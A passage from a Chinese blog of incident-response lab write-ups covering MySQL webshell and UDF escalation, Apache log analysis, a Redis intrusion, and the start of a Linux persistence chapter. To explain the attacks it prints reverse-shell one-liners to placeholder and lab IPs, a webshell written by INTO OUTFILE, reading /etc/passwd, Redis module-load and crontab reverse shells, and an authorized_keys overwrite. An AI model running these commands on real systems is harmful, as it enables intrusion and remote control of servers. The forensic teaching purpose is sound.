<h3 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h3><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">攻击者准备监听：</span><br><span class="line">攻击者在其控制的服务器上启动一个监听程序（通常是一个Netcat或类似工具），等待目标系统主动连接。</span><br><span class="line">nc -lvp 4444</span><br><span class="line">这里，-l表示监听模式，-v表示冗长输出，-p指定端口。</span><br><span class="line"></span><br><span class="line">目标系统执行恶意代码：</span><br><span class="line">攻击者通过漏洞利用、社交工程等手段，在目标系统上执行恶意代码。这段代码会打开一个Shell，并尝试连接攻击者的服务器。</span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/attacker_ip/4444 0&gt;&amp;1</span><br><span class="line">这个命令的作用是通过TCP连接攻击者的IP地址和端口，并将输入和输出重定向到这个连接上。</span><br><span class="line"></span><br><span class="line">建立连接：</span><br><span class="line">目标系统主动向攻击者的服务器发起连接请求。由于是目标系统主动连接，一般不会被防火墙阻拦。</span><br><span class="line"></span><br><span class="line">攻击者获得Shell访问：</span><br><span class="line">一旦连接建立，攻击者就可以在其控制服务器上得到一个远程Shell，能够像在本地终端一样执行命令，控制目标系统。</span><br></pre></td></tr></table></figure>



<h4 id="在MySQL里面，提权有三种方式"><a href="#在MySQL里面，提权有三种方式" class="headerlink" title="在MySQL里面，提权有三种方式:"></a>在MySQL里面，提权有三种方式:</h4><h4 id="·INTO-OUTFILE（写入文件）：写入恶意代码，生成一个webshell；"><a href="#·INTO-OUTFILE（写入文件）：写入恶意代码，生成一个webshell；" class="headerlink" title="·INTO OUTFILE（写入文件）：写入恶意代码，生成一个webshell；"></a>·<code>INTO OUTFILE</code>（写入文件）：写入恶意代码，生成一个webshell；</h4><h5 id="eg"><a href="#eg" class="headerlink" title="eg:"></a>eg:</h5><h5 id="SELECT-INTO-OUTFILE-var-www-html-shell-php"><a href="#SELECT-INTO-OUTFILE-var-www-html-shell-php" class="headerlink" title="SELECT  &lt;?php system($_GET[]); ?&gt; INTO OUTFILE &#39;/var/www/html/shell.php&#39;;"></a><code>SELECT  &lt;?php system($_GET[]); ?&gt; INTO OUTFILE &#39;/var/www/html/shell.php&#39;;</code></h5><h5 id="这个命令将在-var-www-html-目录下创建一个名为-shell-php-的文件，包含一个简单的-Web-Shell，攻击者可以通过访问该文件执行任意系统命令。"><a href="#这个命令将在-var-www-html-目录下创建一个名为-shell-php-的文件，包含一个简单的-Web-Shell，攻击者可以通过访问该文件执行任意系统命令。" class="headerlink" title="这个命令将在 &#x2F;var&#x2F;www&#x2F;html&#x2F; 目录下创建一个名为 shell.php 的文件，包含一个简单的 Web Shell，攻击者可以通过访问该文件执行任意系统命令。"></a>这个命令将在 &#x2F;var&#x2F;www&#x2F;html&#x2F; 目录下创建一个名为 shell.php 的文件，包含一个简单的 Web Shell，攻击者可以通过访问该文件执行任意系统命令。</h5><h4 id="·LOAD-FILE-收集信息-：读取敏感文件-读取密码"><a href="#·LOAD-FILE-收集信息-：读取敏感文件-读取密码" class="headerlink" title="·LOAD_FILE(收集信息)：读取敏感文件(读取密码)"></a>·<code>LOAD_FILE</code>(收集信息)：读取敏感文件(读取密码)</h4><h5 id="SELECT-LOAD-FILE-etc-passwd"><a href="#SELECT-LOAD-FILE-etc-passwd" class="headerlink" title="SELECT LOAD_FILE(&#39;/etc/passwd&#39;);"></a><code>SELECT LOAD_FILE(&#39;/etc/passwd&#39;);</code></h5><h5 id="这个命令会返回-etc-passwd-文件的内容，其中包含所有用户的信息。"><a href="#这个命令会返回-etc-passwd-文件的内容，其中包含所有用户的信息。" class="headerlink" title="这个命令会返回 /etc/passwd 文件的内容，其中包含所有用户的信息。"></a>这个命令会返回 <code>/etc/passwd</code> 文件的内容，其中包含所有用户的信息。</h5><h4 id="·udf执行系统命令"><a href="#·udf执行系统命令" class="headerlink" title="·udf执行系统命令"></a>·udf执行系统命令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UDF（用户定义函数）允许用户扩展 MySQL 的功能。如果攻击者可以将恶意的共享库上传到服务器，他们可以利用 UDF 执行任意系统命令。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.上传恶意共享库 lib_mysqludf_sys.so 到 MySQL 服务器的插件目录。</span><br><span class="line">2.创建 UDF 函数：</span><br><span class="line">  CREATE FUNCTION sys_exec RETURNS INTEGER SONAME &#x27;lib_mysqludf_sys.so&#x27;;</span><br><span class="line">3.使用 UDF 执行系统命令：</span><br><span class="line">  SELECT sys_exec(&#x27;id &gt; /tmp/output.txt&#x27;);</span><br><span class="line"></span><br><span class="line">这个命令将在 /tmp 目录下创建一个文件 output.txt，其中包含执行 id 命令的结果。</span><br></pre></td></tr></table></figure>



<h3 id="解题过程-2"><a href="#解题过程-2" class="headerlink" title="解题过程"></a>解题过程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.黑客第一次写入的shell flag&#123;关键字符串&#125;</span><br><span class="line">2.黑客反弹shell的ip flag&#123;ip&#125;</span><br><span class="line">3.黑客提权文件的完整路径 md5 flag&#123;md5&#125; 注 /xxx/xxx/xxx/xxx/xxx.xx</span><br><span class="line">4.黑客获取的权限 flag&#123;whoami后的值&#125;</span><br></pre></td></tr></table></figure>

<h4 id="1-3"><a href="#1-3" class="headerlink" title="1."></a>1.</h4><h5 id="在-var-www-html-目录下find-name-php-xargs-grep-a-eval"><a href="#在-var-www-html-目录下find-name-php-xargs-grep-a-eval" class="headerlink" title="在&#x2F;var&#x2F;www&#x2F;html&#x2F;目录下find ./ -name &quot;*.php&quot; | xargs grep -a &quot;eval(&quot;"></a>在&#x2F;var&#x2F;www&#x2F;html&#x2F;目录下<code>find ./ -name &quot;*.php&quot; | xargs grep -a &quot;eval(&quot;</code></h5><h4 id="2-2"><a href="#2-2" class="headerlink" title="2."></a>2.</h4><h5 id="既然是反弹shell那么，黑客的ip在反弹的shell里面，我们可以通过查看mysql日志文件，主要是注意查询日志和错误日志-日志在-var-log-mysql下面看到error-log-在日志看到"><a href="#既然是反弹shell那么，黑客的ip在反弹的shell里面，我们可以通过查看mysql日志文件，主要是注意查询日志和错误日志-日志在-var-log-mysql下面看到error-log-在日志看到" class="headerlink" title="既然是反弹shell那么，黑客的ip在反弹的shell里面，我们可以通过查看mysql日志文件，主要是注意查询日志和错误日志,日志在&#x2F;var&#x2F;log&#x2F;mysql下面看到error.log,在日志看到"></a>既然是反弹shell那么，黑客的ip在反弹的shell里面，我们可以通过查看mysql日志文件，主要是注意<code>查询日志和错误日志</code>,日志在&#x2F;var&#x2F;log&#x2F;mysql下面看到error.log,在日志看到</h5><p><img src="https://free.picui.cn/free/2025/08/06/68930b1dda7b8.png" alt="1754467093753.png"></p>
<h5 id="这段是把1-sh文件保存下来的操作，这个文件在-tmp目录下面，我们访问一下-tmp-ls一下就可以看到1-sh的文件，文件内容是"><a href="#这段是把1-sh文件保存下来的操作，这个文件在-tmp目录下面，我们访问一下-tmp-ls一下就可以看到1-sh的文件，文件内容是" class="headerlink" title="这段是把1.sh文件保存下来的操作，这个文件在&#x2F;tmp目录下面，我们访问一下&#x2F;tmp&#x2F;,ls一下就可以看到1.sh的文件，文件内容是"></a>这段是把1.sh文件保存下来的操作，这个文件在&#x2F;tmp目录下面，我们访问一下&#x2F;tmp&#x2F;,ls一下就可以看到1.sh的文件，文件内容是</h5><h5 id="bash-i-dev-tcp-192-168-100-13-777-0-1root-xuanji-tmp-一个反弹shell文件内容"><a href="#bash-i-dev-tcp-192-168-100-13-777-0-1root-xuanji-tmp-一个反弹shell文件内容" class="headerlink" title="bash -i &gt;&amp;/dev/tcp/192.168.100.13/777 0&gt;&amp;1root@xuanji:/tmp#一个反弹shell文件内容"></a><code>bash -i &gt;&amp;/dev/tcp/192.168.100.13/777 0&gt;&amp;1root@xuanji:/tmp#</code>一个反弹shell文件内容</h5><h5 id="ip也在里面"><a href="#ip也在里面" class="headerlink" title="ip也在里面"></a>ip也在里面</h5><h4 id="3-3"><a href="#3-3" class="headerlink" title="3."></a>3.</h4><h5 id="然后在这里是UDF-执行系统命令（这里是存在反弹shell，可能是通过udf把shell传上来的）"><a href="#然后在这里是UDF-执行系统命令（这里是存在反弹shell，可能是通过udf把shell传上来的）" class="headerlink" title="然后在这里是UDF 执行系统命令（这里是存在反弹shell，可能是通过udf把shell传上来的）"></a>然后在这里是UDF 执行系统命令（这里是存在反弹shell，可能是通过udf把shell传上来的）</h5><h5 id="既然udf会上传一个恶意so文件上来到mysql插件目录，利用so文件实现udf，"><a href="#既然udf会上传一个恶意so文件上来到mysql插件目录，利用so文件实现udf，" class="headerlink" title="既然udf会上传一个恶意so文件上来到mysql插件目录，利用so文件实现udf，"></a>既然udf会上传一个恶意so文件上来到mysql插件目录，利用so文件实现udf，</h5><h5 id="usr-lib-mysql-plugin-默认上传在这里，访问它"><a href="#usr-lib-mysql-plugin-默认上传在这里，访问它" class="headerlink" title="/usr/lib/mysql/plugin/默认上传在这里，访问它"></a><code>/usr/lib/mysql/plugin/</code>默认上传在这里，访问它</h5><h5 id="-5"><a href="#-5" class="headerlink" title=""></a><img src="https://free.picui.cn/free/2025/08/06/68930b0473575.png" alt="1754467093747.png"></h5><p><code>ls -a</code>可以看到</p>
<h4 id="4-2"><a href="#4-2" class="headerlink" title="4."></a>4.</h4><h5 id="在so文件上传上来后创建udf函数，可以通过查找新增函数"><a href="#在so文件上传上来后创建udf函数，可以通过查找新增函数" class="headerlink" title="在so文件上传上来后创建udf函数，可以通过查找新增函数"></a>在so文件上传上来后创建udf函数，可以通过查找新增函数</h5><h5 id="select-from-mysql-func"><a href="#select-from-mysql-func" class="headerlink" title="select * from mysql.func"></a><code>select * from mysql.func</code></h5><h5 id="-6"><a href="#-6" class="headerlink" title=""></a><img src="https://free.picui.cn/free/2025/08/06/68930b0478408.png" alt="1754467093748.png"></h5><h5 id="要求whoami后的值select-sys-eval-whoami"><a href="#要求whoami后的值select-sys-eval-whoami" class="headerlink" title="要求whoami后的值select sys_eval(&#39;whoami&#39;);"></a>要求whoami后的值<code>select sys_eval(&#39;whoami&#39;);</code></h5><h5 id="-7"><a href="#-7" class="headerlink" title=""></a><img src="https://free.picui.cn/free/2025/08/06/68930b047ae00.png" alt="1754467093748.png"></h5><h1 id="DAY4"><a href="#DAY4" class="headerlink" title="DAY4"></a>DAY4</h1><h2 id="第二章日志分析-apache日志分析"><a href="#第二章日志分析-apache日志分析" class="headerlink" title="第二章日志分析-apache日志分析"></a>第二章日志分析-apache日志分析</h2><h3 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h3><h4 id="apache日志路径："><a href="#apache日志路径：" class="headerlink" title="apache日志路径："></a>apache日志路径：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Debian/Ubuntu:</span><br><span class="line">访问：/var/log/apache2/access.log</span><br><span class="line">错误：/var/log/apache2/error.log</span><br><span class="line">Red Hat/CentOS 系统：</span><br><span class="line">访问：/var/log/httpd/access_log</span><br><span class="line">错误：/var/log/httpd/error_log</span><br></pre></td></tr></table></figure>

<h4 id="浏览器指纹可以包括但不限于以下信息："><a href="#浏览器指纹可以包括但不限于以下信息：" class="headerlink" title="浏览器指纹可以包括但不限于以下信息："></a>浏览器指纹可以包括但不限于以下信息：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1. **User Agent（用户代理）**：浏览器发送给服务器的请求头部中包含的浏览器类型、版本、操作系统等信息。</span><br><span class="line">2. **屏幕分辨率**：用户的屏幕大小和分辨率。</span><br><span class="line">3. **系统字体**：用户系统中安装的字体列表。</span><br><span class="line">4. **Canvas 指纹**：利用HTML5的Canvas元素生成的图像，由于不同浏览器和操作系统的渲染差异，可以生成独特的哈希值。</span><br><span class="line">5. **WebGL 指纹**：使用WebGL渲染3D图形，同样可以因为渲染差异产生独特的指纹。</span><br><span class="line">6. **AudioContext 指纹**：通过Web Audio API创建音频上下文，不同浏览器和设备的音频处理差异可以作为识别依据。</span><br><span class="line">7. **插件信息**：如Flash、Java等插件的存在与否及其版本信息。</span><br><span class="line">8. **硬件加速**：浏览器是否使用GPU进行硬件加速。</span><br><span class="line">9. **语言设置**：浏览器的语言偏好设置。</span><br><span class="line">10. **时区和地理位置**：用户的时区信息，有时也可以作为识别依据。</span><br></pre></td></tr></table></figure>

<h4 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sort -nr:</span><br><span class="line"></span><br><span class="line">    对提取出的 IP 地址进行逆序排序（-nr 表示按数值逆序排序）。</span><br><span class="line"></span><br><span class="line">uniq -c:</span><br><span class="line"></span><br><span class="line">    统计排序后的 IP 地址的出现次数。输出结果的每一行包含两个字段：第一个字段是 IP 地址出现的次数，第二个字段是 IP 地址本身。</span><br><span class="line"></span><br><span class="line">wc -l:</span><br><span class="line"></span><br><span class="line">    计算统计结果的行数，即不同 IP 地址的数量。</span><br></pre></td></tr></table></figure>



<h3 id="解题过程：-1"><a href="#解题过程：-1" class="headerlink" title="解题过程："></a>解题过程：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、提交当天访问次数最多的IP，即黑客IP：</span><br><span class="line">2、黑客使用的浏览器指纹是什么，提交指纹的md5：</span><br><span class="line">3、查看index.php页面被访问的次数，提交次数：</span><br><span class="line">4、查看黑客IP访问了多少次，提交次数：</span><br><span class="line">5、查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:</span><br></pre></td></tr></table></figure>

<h4 id="1-4"><a href="#1-4" class="headerlink" title="1."></a>1.</h4><h5 id="cat-var-log-nginx-access-log-1-awk-print-1-sort-uniq-c-sort-nr"><a href="#cat-var-log-nginx-access-log-1-awk-print-1-sort-uniq-c-sort-nr" class="headerlink" title="cat /var/log/nginx/access.log.1 | awk &#39;{print $1}&#39; | sort | uniq -c | sort -nr"></a><code>cat /var/log/nginx/access.log.1 | awk &#39;&#123;print $1&#125;&#39; | sort | uniq -c | sort -nr</code></h5><h4 id="2-3"><a href="#2-3" class="headerlink" title="2."></a>2.</h4><h5 id="这里收集的是ua头；"><a href="#这里收集的是ua头；" class="headerlink" title="这里收集的是ua头；"></a>这里收集的是ua头；</h5><h5 id="查看日志里的黑客ip的ua头"><a href="#查看日志里的黑客ip的ua头" class="headerlink" title="查看日志里的黑客ip的ua头"></a>查看日志里的黑客ip的ua头</h5><h4 id="3-4"><a href="#3-4" class="headerlink" title="3."></a>3.</h4><h5 id="grep-index-php-var-log-apache2-access-log-1-wc-l"><a href="#grep-index-php-var-log-apache2-access-log-1-wc-l" class="headerlink" title="grep &#39;/index.php&#39; /var/log/apache2/access.log.1 | wc -l"></a><code>grep &#39;/index.php&#39; /var/log/apache2/access.log.1 | wc -l</code></h5><h4 id="4-3"><a href="#4-3" class="headerlink" title="4."></a>4.</h4><h5 id="次数在第一次查ip的时候就获得了"><a href="#次数在第一次查ip的时候就获得了" class="headerlink" title="次数在第一次查ip的时候就获得了"></a>次数在第一次查ip的时候就获得了</h5><h4 id="5-1"><a href="#5-1" class="headerlink" title="5."></a>5.</h4><h5 id="cat-access-log-1-grep-“03-Aug-2023-08-”-awk-‘-print-1-’-sort-nr-uniq-c-wc-l"><a href="#cat-access-log-1-grep-“03-Aug-2023-08-”-awk-‘-print-1-’-sort-nr-uniq-c-wc-l" class="headerlink" title="cat access.log.1 | grep “03/Aug/2023:08:” | awk ‘{print $1}’ | sort -nr| uniq -c |wc -l"></a><code>cat access.log.1 | grep “03/Aug/2023:08:” | awk ‘&#123;print $1&#125;’ | sort -nr| uniq -c |wc -l</code></h5><h1 id="DAY5"><a href="#DAY5" class="headerlink" title="DAY5"></a>DAY5</h1><h2 id="第二章日志分析-redis应急响应"><a href="#第二章日志分析-redis应急响应" class="headerlink" title="第二章日志分析-redis应急响应*"></a>第二章日志分析-redis应急响应*</h2><h4 id="http-t-csdnimg-cn-Qqk5M"><a href="#http-t-csdnimg-cn-Qqk5M" class="headerlink" title="http://t.csdnimg.cn/Qqk5M"></a><a target="_blank" rel="noopener" href="http://t.csdnimg.cn/Qqk5M">http://t.csdnimg.cn/Qqk5M</a></h4><h3 id="知识点：-1"><a href="#知识点：-1" class="headerlink" title="知识点："></a>知识点：</h3><h4 id="关于Redis的攻击手法有："><a href="#关于Redis的攻击手法有：" class="headerlink" title="关于Redis的攻击手法有："></a>关于Redis的攻击手法有：</h4><h5 id="redis未授权访问漏洞"><a href="#redis未授权访问漏洞" class="headerlink" title="-redis未授权访问漏洞"></a>-redis未授权访问漏洞</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis的未授权访问漏洞的影响范围是在Redis &lt;=5.0.5</span><br></pre></td></tr></table></figure>

<h5 id="redis主从复制getshell"><a href="#redis主从复制getshell" class="headerlink" title="redis主从复制getshell"></a>redis主从复制getshell</h5><h6 id="419-S-通常表示这是从服务器（Slave）的日志记录。这里的-“S”-代表-“Slave”。"><a href="#419-S-通常表示这是从服务器（Slave）的日志记录。这里的-“S”-代表-“Slave”。" class="headerlink" title="419:S 通常表示这是从服务器（Slave）的日志记录。这里的 “S” 代表 “Slave”。"></a>419:S 通常表示这是从服务器（Slave）的日志记录。这里的 “S” 代表 “Slave”。</h6><h6 id="419-M-表示这是主服务器（Master）的日志记录。这里的-“M”-代表-“Master”。"><a href="#419-M-表示这是主服务器（Master）的日志记录。这里的-“M”-代表-“Master”。" class="headerlink" title="419:M 表示这是主服务器（Master）的日志记录。这里的 “M” 代表 “Master”。"></a>419:M 表示这是主服务器（Master）的日志记录。这里的 “M” 代表 “Master”。</h6><pre><code>config set dir /tmp/ //设置文件路径为/tmp/
config set dbfilename exp.so //设置数据库文件名为：exp.so
slaveof vpsip port //设置主redis地址为 vpsip，端口为 port
module load /tmp/exp.so
system.exec &#39;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#39;
</code></pre>
<h5 id="利用crontab写入定时任务反弹shell"><a href="#利用crontab写入定时任务反弹shell" class="headerlink" title="利用crontab写入定时任务反弹shell:"></a>利用crontab写入定时任务反弹shell:</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.100.13 #连接</span><br><span class="line"></span><br><span class="line">redis flushall #清除所有键值</span><br><span class="line"></span><br><span class="line">config set dir /var/spool/cron/crontabs/ #设置保存路径</span><br><span class="line"></span><br><span class="line">config set dbfilename shell #保存名称</span><br><span class="line"></span><br><span class="line">set xz “\n * bash -i &gt;&amp; /dev/tcp/192.168.100.13/7777 0&gt;&amp;1\n” #将反弹shell写入xz键值</span><br><span class="line"></span><br><span class="line">save #写入保存路径的shell文件</span><br></pre></td></tr></table></figure>

<h5 id="利用ssh-keygen-公钥登录服务器的方式："><a href="#利用ssh-keygen-公钥登录服务器的方式：" class="headerlink" title="利用ssh-keygen 公钥登录服务器的方式："></a>利用ssh-keygen 公钥登录服务器的方式：</h5><h6 id="SSH提供两种登录验证方式，一种是账号密码登录，另一种是密钥验证。"><a href="#SSH提供两种登录验证方式，一种是账号密码登录，另一种是密钥验证。" class="headerlink" title="SSH提供两种登录验证方式，一种是账号密码登录，另一种是密钥验证。"></a>SSH提供两种登录验证方式，一种是账号密码登录，另一种是密钥验证。</h6><h6 id="当redis以root身份运行，可以给root账户写入ssh公钥权限，直接通过ssh登录服务器，"><a href="#当redis以root身份运行，可以给root账户写入ssh公钥权限，直接通过ssh登录服务器，" class="headerlink" title="当redis以root身份运行，可以给root账户写入ssh公钥权限，直接通过ssh登录服务器，"></a>当redis以root身份运行，可以给root账户写入ssh公钥权限，直接通过ssh登录服务器，</h6><h6 id="在攻击机中申生成ssh公钥和私钥，密码设为空"><a href="#在攻击机中申生成ssh公钥和私钥，密码设为空" class="headerlink" title="在攻击机中申生成ssh公钥和私钥，密码设为空"></a>在攻击机中申生成ssh公钥和私钥，密码设为空</h6><pre><code>ssh-keygen -t rsa
进入.ssh目录:cd .ssh/ 将生成的公钥保存到1.txt
(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; 1.txt
cat 1.txt | redis-cli -h [] -x set crack
redis-cli -h 192.168.157.129
config set dir /root/.ssh       #	更改redis备份路径为ssh公钥存放目录（一般为/root/.ssh）
config set dbfilename authorized_keys  #设置上传公钥的备份文件名字为authorized_keys
config get dbfilename #检查是否更改成功
save      #保存
exit       #退出
ssh -i id_rsa root@redis的IP   #在攻击机上使用ssh免密登录靶机
</code></pre>
<h3 id="解题过程：-2"><a href="#解题过程：-2" class="headerlink" title="解题过程："></a>解题过程：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.通过本地 PC SSH到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;</span><br><span class="line">2.通过本地 PC SSH到服务器并且分析黑客第一次上传的恶意文件,将黑客上传的恶意文件里面的 FLAG 提交;</span><br><span class="line">3.通过本地 PC SSH到服务器并且分析黑客反弹 shell 的IP 为多少,将反弹 shell 的IP 作为 FLAG 提交;</span><br><span class="line">4.通过本地 PC SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串(flag&#123;黑客的用户-关键字符串&#125; 注关键字符串 xxx-xxx-xxx)。将用户名和关键字符串作为 FLAG提交</span><br><span class="line">5.通过本地 PC SSH到服务器并且分析黑客篡改的命令,将黑客篡改的命令里面的关键字符串作为 FLAG 提交;</span><br></pre></td></tr></table></figure>

<h4 id="1-2"><a href="#1-2" class="headerlink" title="1.2"></a>1.2</h4><h5 id="先去查日志，查看redis-log-在日志里面我们看到"><a href="#先去查日志，查看redis-log-在日志里面我们看到" class="headerlink" title="先去查日志，查看redis.log,在日志里面我们看到"></a>先去查日志，查看redis.log,在日志里面我们看到</h5><h5 id="-8"><a href="#-8" class="headerlink" title=""></a><img src="https://free.picui.cn/free/2025/08/06/68930b047efcc.png" alt="1754467093748.png"></h5><h5 id="这里看到这个192-168-100-13这个ip-我们一直在连这个ip-但是一直被拒绝，像是在爆破"><a href="#这里看到这个192-168-100-13这个ip-我们一直在连这个ip-但是一直被拒绝，像是在爆破" class="headerlink" title="这里看到这个192.168.100.13这个ip,我们一直在连这个ip,但是一直被拒绝，像是在爆破"></a>这里看到这个<code>192.168.100.13</code>这个ip,我们一直在连这个ip,但是一直被拒绝，像是在爆破</h5><h5 id="继续看到下面"><a href="#继续看到下面" class="headerlink" title="继续看到下面"></a>继续看到下面</h5><p><img src="https://free.picui.cn/free/2025/08/06/68930b049fb38.png" alt="1754467093748.png"></p>
<h5 id="大模型分析大概就是说，这一块是在进行从服务器在尝试与主服务器同步"><a href="#大模型分析大概就是说，这一块是在进行从服务器在尝试与主服务器同步" class="headerlink" title="大模型分析大概就是说，这一块是在进行从服务器在尝试与主服务器同步"></a>大模型分析大概就是说，这一块是在进行从服务器在尝试与主服务器同步</h5><p><img src="https://free.picui.cn/free/2025/08/06/68930b1e0bcc5.png" alt="1754467093753.png"></p>
<h5 id="最后连的是192-168-100-20应该就是黑客攻击成功的ip"><a href="#最后连的是192-168-100-20应该就是黑客攻击成功的ip" class="headerlink" title="最后连的是192.168.100.20应该就是黑客攻击成功的ip"></a>最后连的是<code>192.168.100.20</code>应该就是黑客攻击成功的ip</h5><h5 id="我们把so文件down下来，放到微步云沙盒过一遍，看到是getshell文件"><a href="#我们把so文件down下来，放到微步云沙盒过一遍，看到是getshell文件" class="headerlink" title="我们把so文件down下来，放到微步云沙盒过一遍，看到是getshell文件"></a>我们把so文件down下来，放到微步云沙盒过一遍，看到是getshell文件</h5><h5 id="-9"><a href="#-9" class="headerlink" title=""></a><img src="https://free.picui.cn/free/2025/08/06/68930b07b8696.png" alt="1754467093749.png"></h5><h5 id="然后是放在010里面看到flag"><a href="#然后是放在010里面看到flag" class="headerlink" title="然后是放在010里面看到flag"></a>然后是放在010里面看到flag</h5><h4 id="3-5"><a href="#3-5" class="headerlink" title="3."></a>3.</h4><h5 id="crontab-l分析主机的定时任务就可以看到反弹shell的IP"><a href="#crontab-l分析主机的定时任务就可以看到反弹shell的IP" class="headerlink" title="crontab -l分析主机的定时任务就可以看到反弹shell的IP"></a>crontab -l分析主机的定时任务就可以看到反弹shell的IP</h5><h4 id="4-4"><a href="#4-4" class="headerlink" title="4."></a>4.</h4><h5 id="所以我们可以去看-root-ssh-ssh它是隐藏文件，需要ls-a才能看到他"><a href="#所以我们可以去看-root-ssh-ssh它是隐藏文件，需要ls-a才能看到他" class="headerlink" title="所以我们可以去看&#x2F;root&#x2F;.ssh(ssh它是隐藏文件，需要ls -a才能看到他)"></a>所以我们可以去看&#x2F;root&#x2F;.ssh(ssh它是隐藏文件，需要ls -a才能看到他)</h5><p><img src="https://free.picui.cn/free/2025/08/06/68930b076ccc7.png" alt="1754467093749.png"></p>
<h5 id="在github上搜索找到"><a href="#在github上搜索找到" class="headerlink" title="在github上搜索找到"></a>在github上搜索找到</h5><p><img src="https://free.picui.cn/free/2025/08/06/68930b079b870.png" alt="1754467093749.png"></p>
<h5 id="flag-xj-test-user-wow-you-find-flag"><a href="#flag-xj-test-user-wow-you-find-flag" class="headerlink" title="flag{xj-test-user-wow-you-find-flag}"></a>flag{xj-test-user-wow-you-find-flag}</h5><h4 id="5-2"><a href="#5-2" class="headerlink" title="5."></a>5.</h4><h5 id="cd-usr-bin-ls-cat-ps"><a href="#cd-usr-bin-ls-cat-ps" class="headerlink" title="cd /usr/bin ls cat ps"></a><code>cd /usr/bin</code> <code>ls</code> <code>cat ps</code></h5><h5 id="-10"><a href="#-10" class="headerlink" title=""></a><img src="https://free.picui.cn/free/2025/08/06/68930b07cc0da.png" alt="1754467093749.png"></h5><h5 id="-11"><a href="#-11" class="headerlink" title=""></a><img src="https://free.picui.cn/free/2025/08/06/68930b08658cb.png" alt="1754467093749.png"></h5><h1 id="DAY6"><a href="#DAY6" class="headerlink" title="DAY6"></a>DAY6</h1><h2 id="第三章-权限维持-linux权限维持-隐藏"><a href="#第三章-权限维持-linux权限维持-隐藏" class="headerlink" title="第三章 权限维持-linux权限维持-隐藏"></a>第三章 权限维持-linux权限维持-隐藏</h2><h4 id="http-t-csdnimg-cn-EPO10"><a href="#http-t-csdnimg-cn-EPO10" class="headerlink" title="http://t.csdnimg.cn/EPO10"></a><a target="_blank" rel="noopener" href="http://t.csdnimg.cn/EPO10">http://t.csdnimg.cn/EPO10</a></h4><h4 id="黑客在拿到权限之后，通常会进行权限的维持来保证自己一直能控制受害人的服务器"><a href="#黑客在拿到权限之后，通常会进行权限的维持来保证自己一直能控制受害人的服务器" class="headerlink" title="黑客在拿到权限之后，通常会进行权限的维持来保证自己一直能控制受害人的服务器"></a>黑客在拿到权限之后，通常会进行权限的维持来保证自己一直能控制受害人的服务器</h4><h3 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h3><h4 id="常见的-Linux-权限维持和隐藏方法："><a href="#常见的-Linux-权限维持和隐藏方法：" class="headerlink" title="常见的 Linux 权限维持和隐藏方法："></a>常见的 Linux 权限维持和隐藏方法：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 